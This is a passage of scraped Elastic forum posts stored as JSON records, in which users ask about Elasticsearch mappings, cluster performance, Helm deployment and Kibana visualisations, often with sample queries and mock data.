    "url": "https://discuss.elastic.co/t/multi-dynamic-templates-issue/228296",
    "title": "Multi dynamic templates - issue",
    "category": [
      "Elasticsearch"
    ],
    "author": "adude946",
    "date": "April 16, 2020, 10:27am",
    "body": "I'm testing implementing multiple dynamic templates on 3 different fields but each time mapping is not getting created correctly. Only the first array object template is picked up. Any help would be great on what is wrong or any alternative way to achieve this. Need different objects to have different dynamic mappings, some are root level and some are inner objects. Mapping: PUT /test-dy { \"mappings\": { \"dynamic\": \"strict\", \"dynamic_templates\": [ { \"default\": { \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"keyword\" } } }, { \"custom_field1\": { \"path_match\": \"fld1.*\", \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"text\", \"fields\": { \"keyword\": {\"type\": \"keyword\"} } } } }, { \"custom_field2\": { \"path_match\": \"fld2.*\", \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"text\" } } }, { \"custom_field3\": { \"path_match\": \"fld3.profile.*\", \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"text\" } } } ], \"properties\": { \"fld1\": {\"type\": \"object\", \"dynamic\": \"true\"}, \"fld2\": {\"type\": \"object\", \"dynamic\": \"true\"}, \"fld3\": {\"type\": \"object\", \"properties\":{ \"name\":{\"type\": \"text\"}, \"profile\":{\"type\": \"nested\", \"dynamic\": \"true\"} }}, \"fld4\": {\"type\": \"text\"} } } } Mock data: PUT test-dy/_doc/1 { \"fld1\": { \"key1\":\"val1\", \"key2\":\"val2\" }, \"fld2\": { \"key1\":\"val1\", \"profile\":{ \"subkey1\":\"val1\", \"subkey2\": [\"val1\"] } }, \"fld3\": { \"name\":\"xxx\", \"profile\":[{ \"subkey1\":\"val1\", \"subkey2\": [\"val1\"] }] }, \"fld4\": \"hello hi\" }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "39ffc9ed-4c27-467e-9fd4-1d1270a6892a",
    "url": "https://discuss.elastic.co/t/using-sort-with-elastic-request-is-not-returning-score-in-the-response/227890",
    "title": "Using sort with elastic request is not returning score in the response",
    "category": [
      "Elasticsearch"
    ],
    "author": "guruprasadkk",
    "date": "April 14, 2020, 10:39am April 14, 2020, 1:12pm April 15, 2020, 5:47am April 16, 2020, 10:16am April 16, 2020, 10:17am",
    "body": "I am using elasticsearch-rest-high-level-client 7.6.2 version to interact with elastic server from my java application. Now I am planning to use sorting capability in elastic. When I added the sort in the elastic request. I am not getting the scores back in response. I understood that it is expected behaviour and suggestion is to use SearchRequestBuilder#setTrackScores(true) But I am using RestHighLevelClient. with this how can I create the instance of SearchRequestBuilder? Is there any other alternate solution for this problem?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "0151572b-0a0c-45a9-bb13-d164674ea805",
    "url": "https://discuss.elastic.co/t/helm-chart-and-extravolumes/227907",
    "title": "Helm-chart and ExtraVolumes",
    "category": [
      "Elasticsearch"
    ],
    "author": "jgato",
    "date": "April 14, 2020, 12:08pm April 16, 2020, 9:21am April 16, 2020, 9:56am",
    "body": "Hi there, I am deploying a cluster using your helm-chart package and everything goes ok. Now I would like to make something more advanced, like creating a backup repo, and export this directory as a volume. Trying something like that: esConfig: elasticsearch.yml: | path.repo: \"/backup/data/\" ... ... extraVolumes: | - name: backup-volume emptydir: {} extraVolumeMounts: | - name: backup-volume mountPath: /backup/data/ How I have to indicate to use a PVC with my default StorageClass to create the backup-volume? Many thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9bc3b908-1e71-44b6-af28-8319c50c833b",
    "url": "https://discuss.elastic.co/t/es-responding-very-slow-after-rolling-restart/228290",
    "title": "ES responding very slow after Rolling Restart",
    "category": [
      "Elasticsearch"
    ],
    "author": "Vipul_Sharma",
    "date": "April 16, 2020, 9:49am",
    "body": "I have just restart my elasticsearch cluster only data-nodes increase the number of Core after the restart ES is responding very slow The query is taking almost around 3K ms while it uses to take 300ms at max Did we miss something? Is there something else that needs to do? or it will recover with time, it has been 30 mins since the restart and it has not recovered yet ES Version 6.5.4 11 nodes in the cluster having 5 data nodes",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4898082f-7a85-4d2e-94e4-93450d73187d",
    "url": "https://discuss.elastic.co/t/metrics-for-replica-sync-es-7-0-1/227866",
    "title": "Metrics for replica sync - ES 7.0.1",
    "category": [
      "Elasticsearch"
    ],
    "author": "dinesh_gnanasamy",
    "date": "April 14, 2020, 7:48am April 14, 2020, 8:15am April 16, 2020, 9:11am April 16, 2020, 9:25am",
    "body": "Are there any specific metrics which indicate if the replica shards are out of sync wrt primary shards. I checked something which appears relatively closer from _cat/shards API seq_no.global_checkpoint , sqg , globalCheckpoint - Global checkpoint. seq_no.local_checkpoint , sql , localCheckpoint - Local checkpoint But I was looking for some metric which is derived from checkpoint values which would be more on lines of List of shards which are currently out of sync with their corresponding primaries Are there any such direct out-of-sync metrics available or in case no such direct metrics are available, Is it logical to derive from above checkpoint values shardwise ? What is the exact way of deriving the same from checkpoint values ? Thanks in advance dinesh",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "771488a2-6fd9-4bfb-b0ec-3df40e031d88",
    "url": "https://discuss.elastic.co/t/unable-to-start-elasticsearch-in-windows10/227789",
    "title": "Unable to start Elasticsearch in Windows10",
    "category": [
      "Elasticsearch"
    ],
    "author": "srivatsans",
    "date": "April 13, 2020, 3:19pm April 14, 2020, 4:13am April 15, 2020, 6:56am April 15, 2020, 7:19am April 15, 2020, 7:26am April 15, 2020, 7:25am April 15, 2020, 7:25am April 15, 2020, 7:27am April 15, 2020, 7:30am April 15, 2020, 7:39am April 15, 2020, 8:16am April 15, 2020, 11:13am April 15, 2020, 11:34am April 15, 2020, 2:36pm April 16, 2020, 8:56am",
    "body": "I have downloaded 7.6.2 and 7.5.0 .zip versions of ES and unzipped them. When I run '.\\bin\\elasticsearch.bat', it throws error 'The system cannot open the device or file specified'. I have set the JAVA_HOME to the JRE path excluding the '\\bin' in System variables. Yet, the same error. Also tried 7.6.2 using MSI and it threw different error 'Could not find or load main class Warning:'. Please help me!",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "e8ed0398-6756-4389-9e5e-a26cf5e61e14",
    "url": "https://discuss.elastic.co/t/does-es-have-the-incremental-change-function-like-mysql-s-binlog/228259",
    "title": "Does es have the Incremental change function like mysql‘s binlog",
    "category": [
      "Elasticsearch"
    ],
    "author": "q6413260",
    "date": "April 16, 2020, 6:40am April 16, 2020, 7:52am",
    "body": "I want to subscribe es’s Incremental change(some write events like mysql binlog) to trigger some business check event. How can I achieve this goal？Thank you",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fe2a9a51-befe-4a8f-80ef-1da8e83c2c3b",
    "url": "https://discuss.elastic.co/t/elasticsearch-making-app-super-slow/227857",
    "title": "Elasticsearch making app super slow",
    "category": [
      "Elasticsearch"
    ],
    "author": "jonaspreisler",
    "date": "April 14, 2020, 6:30am April 16, 2020, 6:14am April 16, 2020, 6:40am",
    "body": "I use Elasticsearch on Ububtu for my Rails app. After starting Elasticsearch, my app take 30+ seconds to load. Server: 8GB RAM. Before starting Elasticsearch: 5-600MB RAM in use After starting Elasticsearch: 2.5BG+ RAM in use Noone is using the app. Nothing is being indexed. Is this normal? Are there a common rule to put Elasticsearch on a seperate server? Any idea how to fix this? Thank you Jonas",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d2af71c2-b17e-4f2f-acca-dd70467adc26",
    "url": "https://discuss.elastic.co/t/what-do-total-stopped-time-total-throttled-time-total-auto-throttle-mean-in-index-merge-stats-api/228258",
    "title": "What do \"total_stopped_time/total_throttled_time/total_auto_throttle“ mean in index merge stats api?",
    "category": [
      "Elasticsearch"
    ],
    "author": "LoadingZhang",
    "date": "April 16, 2020, 6:39am",
    "body": "I found these metric are slightly large { \"current\": 30, \"current_docs\": 564106582, \"current_size\": \"385.7gb\", \"current_size_in_bytes\": 414198867561, \"total\": 33588, \"total_time\": \"2.9d\", \"total_time_in_millis\": 253116884, \"total_docs\": 5155766117, \"total_size\": \"3.6tb\", \"total_size_in_bytes\": 4043153707134, \"total_stopped_time\": \"21.7h\", \"total_stopped_time_in_millis\": 78316790, \"total_throttled_time\": \"7.9h\", \"total_throttled_time_in_millis\": 28771085, \"total_auto_throttle\": \"5.9gb\", \"total_auto_throttle_in_bytes\": 6432360445 } I read the Doc and google it but no one explain what's mean of them. Could you tell me what do these stats mean? Does these will slow down indexing speed?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4d8d6c94-eff2-47ef-9d13-bc2426a764c2",
    "url": "https://discuss.elastic.co/t/heartbeat-data-roll-up/228254",
    "title": "Heartbeat data roll-up",
    "category": [
      "Elasticsearch"
    ],
    "author": "sderungs",
    "date": "April 16, 2020, 6:21am",
    "body": "Hi I was wondering if there are any good practices around roll-up for data in Elasticsearch coming from Heartbeat or if anyone has experience with it. Some background: We're collecting uptime data from multiple systems and obviously the amount of data can get quite big (with monitors being set to collect data every 15 seconds). However, our needs for data granularity/resolution decreases in time, i.e. for the past 7 days a granularity of 15 seconds is good, but same is not true e.g. for data 1 month back (there e.g. buckets of 5 minute averages would be enough). For data even further back (e.g. 3 months in the past and older) buckets with 60-minute-averages would be enough. The ideas so far: Heartbeat-Index contains contains raw data for the past 2 weeks A roll-up job aggregates data into 5-minute-buckets ILM takes care of deleting raw data older than 2 weeks Another roll-up job aggregates the roll-up index from point 2 above into another index with 60-minute-buckets ILM takes care of deleting rolled-up data from point 2 Questions: Are 4. and 5. even possible? Does the Uptime app in Kibana support roll-up indices? How do you maintain your Heartbeat data? I'm struggling to get a reasonable setup... Cheers, Stefan P.S. The entire Elastic environment is running on version 7.6.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d91f32fc-1e99-4c6c-8d29-3bfebb7e10ad",
    "url": "https://discuss.elastic.co/t/function-score-multi-field-filters-together/228250",
    "title": "Function_score multi field filters together",
    "category": [
      "Elasticsearch"
    ],
    "author": "Mahdi_Bahari",
    "date": "April 16, 2020, 6:02am",
    "body": "this is sample collection that's I want to sort result per custom score in elastic search in so try to read documents so founded function score do it for me https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html I have got searching like below and It works properly. this code sort list Based on Score { \"query\": { \"function_score\": { \"query\": { \"bool\": { \"must\": [ { \"match_all\": { }} ], \"must_not\": [], \"should\": [] } }, \"boost\": \"5\", \"functions\": [ { \"filter\":{ \"term\": { \"soldier\": \"0\" } }, \"weight\": 4 }, { \"filter\":{ \"term\": { \"married\": \"0\" } }, \"weight\": 3 } ], \"score_mode\": \"sum\" } } } But I want filter soldier and married altogether and have one weight for both of them. such as below but It works wrong and does't sort return data Base on score Do you have any idea ?what is it solution for logical and between filter and set one weight for them? thank you please help me { \"query\": { \"function_score\": { \"query\": { \"bool\": { \"must\": [ { \"match_all\": { }} ], \"must_not\": [], \"should\": [] } }, \"boost\": \"5\", \"functions\": [ { \"filter\": [ { \"term\": { \"soldier\": \"0\" } }, { \"term\": { \"married\": \"1\" } } ], \"weight\": 4 } ], \"score_mode\": \"sum\" } } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "cf6865ed-cfd2-45a3-a722-a5cb5076f1d9",
    "url": "https://discuss.elastic.co/t/increasing-index-mapping-nested-objects-limit-settings-value-has-no-effect/228242",
    "title": "Increasing 'index.mapping.nested_objects.limit' setting's value has no effect",
    "category": [
      "Elasticsearch"
    ],
    "author": "elastic2",
    "date": "April 16, 2020, 5:02am",
    "body": "Hello, I am facing an issue, where i get the exception: { \"type\": \"mapper_parsing_exception\", \"reason\": \"The number of nested documents has exceeded the allowed limit of [10000]. This limit can be set by changing the [index.mapping.nested_objects.limit] index level setting.\" } Even after increasing the limit suffeciently, and verifying that index settings have the changed value, i still get the above exception. i checked the exception at prompt which executes elasticsearch , and it outputs this: index {[temp_index][_doc][8K1CgXEBlO2SsOcq_eU6], source[n/a, actual length: [8.9mb], max length: 2kb]} org.elasticsearch.index.mapper.MapperParsingException: The number of nested documents has exceeded the allowed limit of [10000]. This limit can be set by changing the [index.mapping.nested_objects.limit] index level setting. It looks the setting does not have any effect? Also, i think this message : actual length: [8.9mb], max length: 2kb]} has anything to do with the exception? Please let me know how do i solve this. Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "2ec128c3-9235-44d1-ac44-dcd838dced89",
    "url": "https://discuss.elastic.co/t/thread-pool-configuration-max-thread-pool-size/228089",
    "title": "Thread Pool Configuration - Max thread_pool.size?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Vipul_Sharma",
    "date": "April 15, 2020, 10:36am April 15, 2020, 10:44am April 15, 2020, 11:06am April 15, 2020, 11:19am April 15, 2020, 11:31am April 15, 2020, 11:37am April 15, 2020, 11:55am April 15, 2020, 12:13pm April 15, 2020, 12:22pm April 16, 2020, 4:34am April 16, 2020, 4:34am",
    "body": "Hi All, Kindly help me with my query What could be the best possible configuration for a data-node running on a server having configuration lscpu output> Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian CPU(s): 28 On-line CPU(s) list: 0-27 Thread(s) per core: 1 Core(s) per socket: 2 Socket(s): 14 NUMA node(s): 1 Vendor ID: GenuineIntel CPU family: 6 Model: 79 Model name: Intel(R) Xeon(R) CPU E5-2683 v4 @ 2.10GHz Stepping: 1 CPU MHz: 2097.691 BogoMIPS: 4195.23 Hypervisor vendor: Xen Virtualization type: full L1d cache: 32K L1i cache: 32K L2 cache: 256K L3 cache: 40960K NUMA node0 CPU(s): 0-27 Current Settings are thread_pool: write: size: 24 search: size: 85 queue_size: 500 min_queue_size: 10 max_queue_size: 1000 auto_queue_frame_size: 2000 target_response_time: 1s and there are very high search queries on this server node_name name active queue data-node-1 search 85 51 because of which queue is getting filled up that is ok as our max_queue_size is 1000 but es is rejecting the requests after the queue has reached 51 why so? is it because of target_response_time? and what could be a max value for thread_pool.search.size?",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "89124596-04c2-40a6-a399-ead35e7cf8d9",
    "url": "https://discuss.elastic.co/t/about-the-kibana-category/22",
    "title": "About the Kibana category",
    "category": [
      "Kibana"
    ],
    "author": "Leslie_Hawthorn",
    "date": "April 22, 2015, 3:36pm November 25, 2016, 9:22pm July 6, 2017, 1:31pm",
    "body": "All things about visualizing data in Elasticsearch & Logstash, including how to use Kibana and extending the platform.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "492b919f-843e-4485-9771-bb043bba480c",
    "url": "https://discuss.elastic.co/t/what-does-ignored-column-represents-in-kibana-monitor/229155",
    "title": "What does \"Ignored\" column represents in Kibana monitor?",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 22, 2020, 1:33am April 22, 2020, 9:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a0ee129e-f910-49ea-b9fb-7e089d0baa6f",
    "url": "https://discuss.elastic.co/t/how-to-find-difference-in-ingested-logs-using-kibana-visualization/228944",
    "title": "How to find difference in ingested logs using Kibana visualization?",
    "category": [
      "Kibana"
    ],
    "author": "rajdevworks",
    "date": "April 20, 2020, 11:29pm April 22, 2020, 7:07pm April 22, 2020, 8:15pm April 22, 2020, 8:58pm",
    "body": "I have a continuous stream of logs being ingested in ELK stack and created visualizations in Kibana view for monitoring purposes. The logs are ingested from an server application which receives HTTP requests from client. One of the new monitoring requirement is to find out requests failed at time T1 is succeeded at time T2 or not. In the logs, we have timestamp, request ID and request status. Example: Failure request log { \"time_start\": \"10/Apr/2020:16:36:05 +0000\", \"status\": 500, \"request_id\": \"7974457c\", \"object_name\": \"fileA.txt\", } Success request log { \"time_start\": \"10/Apr/2020:16:56:59 +0000\", \"status\": 200, \"request_id\": \"3e35bd25\", } As seen here, there was a retry for the same object 20 minutes later. Using Kibana visualization I want to know if there was an object retry from client performed or not. As seen in the below table, column A have failed object names, while column B have succeeded object names. File4 and File8 object were not retried by the client. Using Kibana, how can I find out such difference? Right now I'm using a script that queries the data node using the index. Can it be achieved using a plugin?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "71f4e9f7-a415-4674-9e15-42e49556b383",
    "url": "https://discuss.elastic.co/t/do-transforms-support-scripted-fields/229350",
    "title": "Do transforms support Scripted fields?",
    "category": [
      "Kibana"
    ],
    "author": "Mark_Duncan",
    "date": "April 22, 2020, 8:46pm",
    "body": "I've started playing with transforms - which look very useful. However, I cannot immediately see that they actually support scripted fields (which I define against a Kibana index). I am trying to sum a couple of them, but values being output simply equal 0 which is not what I expect to see. Thanks in advance, Mark",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "fa0229ec-640a-4ac0-9317-3c80c641b4fd",
    "url": "https://discuss.elastic.co/t/canvas-struggles-to-apply-division-to-table-row/228821",
    "title": "[Canvas] Struggles to apply division to table row",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 21, 2020, 10:48pm April 22, 2020, 8:40pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "18a3710d-e41a-4c60-9587-7668341d057c",
    "url": "https://discuss.elastic.co/t/what-permissions-do-i-need-to-manage-indices-where-i-am-allowed-via-kibana/229349",
    "title": "What permissions do I need to manage indices where I am allowed via kibana?",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 22, 2020, 8:24pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d1fd83b0-7821-4e9a-b22c-96c0b1092fb7",
    "url": "https://discuss.elastic.co/t/time-series-visual-builder-missing-last-date/228767",
    "title": "Time Series Visual Builder missing last date",
    "category": [
      "Kibana"
    ],
    "author": "jogabonito",
    "date": "April 20, 2020, 2:02am April 22, 2020, 8:22pm",
    "body": "Hi I have activated a date filter range between 01.01.2019 and 31.12.2019 (DD.MM.YYYY) But in my TSVB I'm missing the last date, 31.12.2019, its not visable in the graph... The last date visable is 30.12.2019, even though I have chosen to include 31.12.2019. The other visualizations is correct, ex. the sum in the matrix visualisation \"268 431,987\" is the actual sum of the range 01.01.2019 - 31.12.2019 (including 31.12.2019). So if I increase the date range by 1 including 01.01.2020, I can display 31.12.2019 in the graph but then the sum in the matrix visualisation is wrong. Why can I not display 31.12.2019 in my graph with this settings? In the TSVB settings I have included the last bucket on all graphs. kibana date range2627×1362 295 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8c5af535-7f81-48ff-9ef8-3e193be7c683",
    "url": "https://discuss.elastic.co/t/kibana-graph-with-7d-interval-grouped-by-a-field-shows-only-previous-week-data-please-help/229284",
    "title": "Kibana graph with 7d interval grouped by a field shows only previous week data - please help",
    "category": [
      "Kibana"
    ],
    "author": "Venkatesh_Murthy",
    "date": "April 22, 2020, 2:44pm April 22, 2020, 6:56pm April 22, 2020, 7:09pm April 22, 2020, 7:14pm April 22, 2020, 7:20pm April 22, 2020, 8:01pm",
    "body": "when i am generating graphs in Kibana for an agregation (sum) of a term for 7 days, why is the graph skipping the current week data, it only shows previous week data. in the discovery i do see records but in the graph it shows current week values as 0, please help",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "6f7a78b7-d546-4855-b9f7-ce3c9d17a24b",
    "url": "https://discuss.elastic.co/t/hdr-histogram-percentiles-with-a-tsvb-visualization/229333",
    "title": "HDR histogram percentiles with a TSVB visualization?",
    "category": [
      "Kibana"
    ],
    "author": "travisbell",
    "date": "April 22, 2020, 6:17pm April 22, 2020, 6:21pm April 22, 2020, 7:37pm April 22, 2020, 7:40pm April 22, 2020, 7:55pm",
    "body": "Hey everyone, While I am able to use the custom \"JSON input\" options on other visualizations like a line graph, it doesn't seem like I can for TSVB. I'm finding the regular percentile aggregation to be very slow (I'm trying to graph latency) and am seeing much better performance on the HDR histogram. Is there any way to get the TSVB percentile aggregation to use HDR?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ad161140-3988-459d-836f-42b5fdd8bdbb",
    "url": "https://discuss.elastic.co/t/dashboards-visualisations-for-heartbeat-data/229205",
    "title": "Dashboards Visualisations for Heartbeat data",
    "category": [
      "Kibana"
    ],
    "author": "Jugsofbeer",
    "date": "April 22, 2020, 8:17am April 22, 2020, 12:53pm April 22, 2020, 7:36pm",
    "body": "Hi, Just wondering if anyones got some cool dashboards they would be willing to export and share for heartbeat v7.6.0 data. I have 300 servers that i have icmp monitors enabled for and collecting good data and seeing it in the baked in Uptime app... but we are keen to do and see the data in more ways.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a5b55903-cef7-4e68-bc09-910002541f33",
    "url": "https://discuss.elastic.co/t/kibana-bar-char-visualization-for-unique-url-call/229316",
    "title": "Kibana Bar Char Visualization for Unique URL call",
    "category": [
      "Kibana"
    ],
    "author": "Cesar_Rojas-Munoz",
    "date": "April 22, 2020, 4:37pm April 22, 2020, 6:18pm April 22, 2020, 7:26pm April 22, 2020, 7:35pm",
    "body": "Hi, I would like to create a horizontal bar visualization in Kibana with API endpoints (methods) use. Most of those endpoints are parameterized and I would like to count unique endpoints. For example, I have the next endpoints: GET http://xyz.com/user/1/profile GET http://xyz.com/user/2/profile GET http://xyz.com/user/3/profile GET http://xyz.com/profile/1 GET http://xyz.com/profile/2 So, the results should be a horizontal bar image1126×791 12.3 KB The problem I am facing now is that I am getting one bar for each entry. Any ideas about how to create a single bar for the unique entries. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6cdd52db-b960-4d49-af84-a79f7f65b5e1",
    "url": "https://discuss.elastic.co/t/kibana-in-docker-while-elasticsearch-in-host-machine-is-it-possible-please-help/228917",
    "title": "Kibana in docker while elasticsearch in host machine - is it possible? - please help",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 20, 2020, 6:26pm April 21, 2020, 2:12am April 21, 2020, 5:18pm April 21, 2020, 6:20pm April 22, 2020, 6:53pm April 22, 2020, 7:30pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "07be05e4-50a7-4d37-8923-b04e2088f3cf",
    "url": "https://discuss.elastic.co/t/creating-a-dashboard-to-show-if-devices-are-up-or-down-via-pings/229124",
    "title": "Creating a dashboard to show if devices are up or down via pings",
    "category": [
      "Kibana"
    ],
    "author": "Mir1",
    "date": "April 21, 2020, 7:57pm April 22, 2020, 7:09pm",
    "body": "Hey all, i have heartbeat configured on a windows server that's monitoring a workstation in my lab. I would like to create a dashboard that shows all devices that are up or down and a summary of total up/down devices as well. I've been trying to create something similar to what you can see on the Uptime page in Kibana but the learning curve is very steep.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5bc02282-c64b-4e3a-af79-99caeaf7c934",
    "url": "https://discuss.elastic.co/t/dynamic-external-hyperlink-on-scripted-field/229076",
    "title": "Dynamic external hyperlink on scripted field",
    "category": [
      "Kibana"
    ],
    "author": "zapho",
    "date": "April 21, 2020, 3:08pm April 21, 2020, 5:52pm April 21, 2020, 9:15pm April 21, 2020, 10:27pm April 22, 2020, 7:42am April 22, 2020, 4:12pm April 22, 2020, 7:08pm",
    "body": "Hi, I'm using 7.5.1 ELK stack and trying to build a dashboard for our CI pipelines. I'm focusing on visualizing SonarQube quality gate data, especially highlighting error counter when code issues are detected. I'm using a painless scripted field in Kibana to do a basic sum over json fields to detect failures: ... for (int i = 0; i < params['_source']['component']['measures'][0]['value']['conditions'].length ; i++) { gateFailedCount += params['_source']['component']['measures'][0]['value']['conditions'][i]['failure']; ... } This is working as expected and I can build Metric visualization based on this scripted field. Now I would like to make this metric (e.g. 2 gate_failures) clickable so that users can go to the matching SonarQube url. The url itself is buildable from the Json payload (http://sonarqubehost/dashboard?id=\" + params['_source']['component']['key']). When I'm using this url to build the return value of the scripted field like this ... return \"<a href='http://sonarqubehost/dashboard?id=\" + params['_source']['component']['key'] + \"'>\" + gateFailedCount + \"</a>\"; the Metric visualisation get messed up: the whole <a href ...> string is used as display text without any hyperlink. Looking at the DOM, the < and > symbol have been transformed into a &lt; and &gt; which explain the issue. I also tried to declare the scripted field as a url format but could not make this work. Is there a way to make this work? Thanks Fabrice",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "f8ec7fe0-9481-4600-b44f-a3edb20cb7c0",
    "url": "https://discuss.elastic.co/t/filter-data-coming-from-2-logstash-instances-joining-in-kibana/228555",
    "title": "Filter data coming from 2 logstash instances joining in kibana",
    "category": [
      "Kibana"
    ],
    "author": "Daniel_Maureira",
    "date": "April 17, 2020, 5:20pm April 22, 2020, 7:05pm",
    "body": "Hello I have the following case that I could not solve. I have 2 Logstash that fetch data from a database, where each one transmits a field called \"codigosap\" that has the following form: J520 ​​or N776 for example. It is an identifier. In addition other types of fields are transmitted. Then in kibana I have a dashboard which shows graphs of the two Logstash. The problem I have is that at the moment of filtering, I click on a graph and I see all the data referring to the Jxxx identifier which is seen in the filters that is applied as \"codigosap.keyword\" with this all ok. However when I filter by sap Nxxx code I can't see all the data in all the graphics. I attach an example image. data1485×554 32.5 KB If I click any JXXX, so in this example it is filtered by J512, and that is OK imagen823×586 24.4 KB but, in the same dashboard, when I want to filter by an N776 codigosap.keyword, I don't get results in the dashboard imagen1325×563 16.4 KB I do not understand what I am missing since the data is in the same format from the source that is the database, char (4). for example, in a visualization that, filter the data with: { \"query\": { \"prefix\": { \"codigosap.keyword\": \"J\" } } } this way I get only the codigosaps that start with J. When I want to get the ones that start with N, I just apply the inverse of the filter: the problem occurs when I filter on the main dashboard this is when it works for the J codigosap imagen689×521 69.2 KB when i apply for codigosap N, it doesn't work to show the data of the 2 logstash imagen1016×476 50.1 KB but if I modify the filter for this case, and I modify it to: codigosap (no keyword, then it works) imagen975×465 73.3 KB { \"query\": { \"match\": { \"codigosap\": { \"query\": \"N776\", \"type\": \"phrase\" } } } }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6c2be1ce-d467-4238-a8a1-c8e9a540721c",
    "url": "https://discuss.elastic.co/t/index-pattern-using-latest-date/228532",
    "title": "Index Pattern using latest date",
    "category": [
      "Kibana"
    ],
    "author": "Mike_Benz",
    "date": "April 17, 2020, 2:06pm April 22, 2020, 7:02pm",
    "body": "To start, I am a noob and am working in the Kibana interface for the system my company setup so I have standard user type rights. I have searched high and low and can't seem to find an answer to this. I have a bunch of indexes from daily imports that span the last 3 months. They are named idx_storage_all_date of import where the date of import is 2020.01.01, 2020.01.02, etc... The index pattern i created was idx_storage_all* and it is great for time series charts. I would like to have a pattern that grabs just the newest dated doc to report on the data as of the last import and cant seem to find out how to do this. I tried using the last import as of a few days ago and when i go into the dash, it still shows data from that date and not yesterdays import. I tried to use the time field at top of the dashboard and I cant figure out how to get the last date. I tried something like 1d-now and depending on the time of the last import I may miss it if it happened say an hour ago. So basically I want to be able to get the most current import if that makes sense? Can someone point me to some documentation that explains what I want to do as I am not finding it. Thx! Mike...",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f365bb50-b0bc-4c7a-bc64-5c1f4344f004",
    "url": "https://discuss.elastic.co/t/how-to-find-same-values-in-different-indizes/229269",
    "title": "How to find same Values in different indizes?",
    "category": [
      "Kibana"
    ],
    "author": "ksremo",
    "date": "April 22, 2020, 1:16pm April 22, 2020, 6:57pm",
    "body": "In this case we have 2 indizes ( Index-A and Index-B). Now i want to list all documents where the value of a field called different in both indizes have the same variable. How to archive this?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "98e69bf8-beb5-4699-a32e-6c44c5ba513b",
    "url": "https://discuss.elastic.co/t/add-a-column-based-on-a-bucket-script-aggregation-or-other-columns-into-a-data-table-visualization/229250",
    "title": "Add a column based on a Bucket Script Aggregation or other columns into a Data Table visualization",
    "category": [
      "Kibana"
    ],
    "author": "mhd.mousa.hamad",
    "date": "April 22, 2020, 11:56am April 22, 2020, 6:55pm",
    "body": "I am building a Data Table in which I could get two required columns but I need to add one additional column which is the difference between these two. Is that somehow possible? I could get the desired results using a Bucket Script Aggregation, but how can I use this in the Data Table? Please consider the following mock-up case for a better explanation. The case is for performance metrics recorded for different machine learning models per customer. We need to show a summary table of the average performance of each model on each measured performance metric on a customer basis. The index mapping template: PUT _template/metrics-template { \"index_patterns\": [ \"metrics-*\" ], \"settings\": { \"analysis\": { \"analyzer\": { \"path-analyzer\": { \"tokenizer\": \"path_hierarchy\" } } } }, \"mappings\": { \"dynamic\": false, \"properties\": { \"path\": { \"type\": \"text\", \"analyzer\": \"path-analyzer\", \"search_analyzer\": \"keyword\", \"fields\": { \"raw\": { \"type\": \"keyword\" } } }, \"time\": { \"type\": \"date\" }, \"labels\": { \"type\": \"object\", \"dynamic\": true }, \"value\": { \"type\": \"double\" } }, \"dynamic_templates\": [ { \"labels_as_keywords\": { \"path_match\": \"labels.*\", \"mapping\": { \"type\": \"keyword\" } } } ] } } The data: POST _bulk {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/mse\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": 1, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": 0.5, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/mse\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": 2, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"nn\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": 0.2, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"nn\"}} {\"index\": {\"_index\": \"metrics-01\"}} 